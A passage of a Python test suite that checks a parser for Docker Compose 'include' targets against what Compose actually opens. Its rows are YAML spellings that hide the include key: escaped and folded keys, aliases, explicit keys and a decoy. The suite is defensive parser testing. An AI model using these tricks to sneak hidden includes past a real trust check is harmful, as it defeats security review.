        ("a colon and a bracket", "include:\n  - :]\n", ":]", False),
        # a key that only an escape or a fold spells, a key that a backslash at the end of a line seems to hide
        ("an escaped key", '"inclu\\u0064e":\n  - b.yml\n', "b.yml", False),
        ("a folded key (an implicit key is one line: Compose reads nothing)", '"inc\\\nlude":\n  - b.yml\n', None, False),
        ("an escaped key after a backslash", 'x: abc\\\n"inc\\x6cude":\n  - b.yml\n', "b.yml", False),
        ("a key after a backslash", "x: abc\\\ninclude:\n  - b.yml\n", "b.yml", False),
        ("an explicit key", "? include\n: [b.yml]\n", "b.yml", False),
        ("an explicit key after a backslash", "x: abc\\\n? include\n: [b.yml]\n", "b.yml", False),
        ("an escaped key and a decoy", "x-decoy: {include: [bA.yml]}\n\"inc\\x6cude\": [b\\x41.yml]\n", "b\\x41.yml", False),
        ("an alias", "x: &l [b.yml]\ninclude: *l\n", "b.yml", False),
        ("a key of the item besides path", "include:\n  - path: b.yml\n    required: false\n", "b.yml", False),
        ("a block scalar", "include:\n  - |\n    b.yml\n", "b.yml\n", False),
    )

    def setUp(self):
        self.root = Path(tempfile.mkdtemp()).resolve()
        self.addCleanup(shutil.rmtree, self.root, ignore_errors=True)
        self.environ = {key: value for key, value in os.environ.items() if not key.startswith("COMPOSE_")}

    def opened(self, text):
        """The files Compose opens for a compose file of this text, relative to its folder: it opens them one at a time, so each
        one that is missing is made (empty) and Compose is asked again."""
        folder = Path(tempfile.mkdtemp(dir=self.root))
        (folder / "compose.yml").write_bytes(text.encode("utf-8"))
        names = []
        for _ in range(8):
            done = subprocess.run(["docker", "compose", "-f", str(folder / "compose.yml"), "config", "--format", "json",
                                   "--no-interpolate", "--no-consistency"], cwd=self.root, env=self.environ, capture_output=True,
                                  text=True, timeout=60)
            missing = re.search(r"open (/.*?): no such file or directory", done.stderr, re.S)
            if done.returncode == 0 or not missing:
                break
            name = os.path.relpath(missing.group(1), folder)
            if name in names or name.startswith(".."):
                break
            names.append(name)
            (folder / name).parent.mkdir(parents=True, exist_ok=True)
            (folder / name).write_text("services: {}\n", encoding="utf-8")
        return names

    def test_every_file_compose_opens_is_a_file_include_targets_names_or_the_answer_is_none(self):
        for label, text, literal, answers in self.ROWS:
            with self.subTest(label):
                found = trust.include_targets(text, f"{self.FOLDER}/compose.yml")
                if literal is not None:
                    self.assertIn(literal, self.opened(text), "Compose opens the file the row says: the row means something")
                    self.assertTrue(found is None or f"{self.FOLDER}/{literal}" in found, found)
                else:
                    self.assertEqual(self.opened(text), [])
                if answers is True:
                    self.assertIsNotNone(found)
                elif answers is False:
                    self.assertIsNone(found)

    def test_the_files_compose_opens_for_a_text_with_two_includes_are_all_named(self):
        for text in ("include:\n  - b.yml\ninclude2: x\n", "include: [b.yml]\nx-n: {include: [c.yml]}\n",
                     "include:\n  - b.yml\n  - path: c.yml\n  - path: [d.yml, 'e.yml']\n"):
            with self.subTest(text=text):
                found = trust.include_targets(text, f"{self.FOLDER}/compose.yml")
                self.assertIsNotNone(found)
                self.assertTrue({f"{self.FOLDER}/{name}" for name in self.opened(text)} <= set(found), found)


if __name__ == "__main__":
    unittest.main()
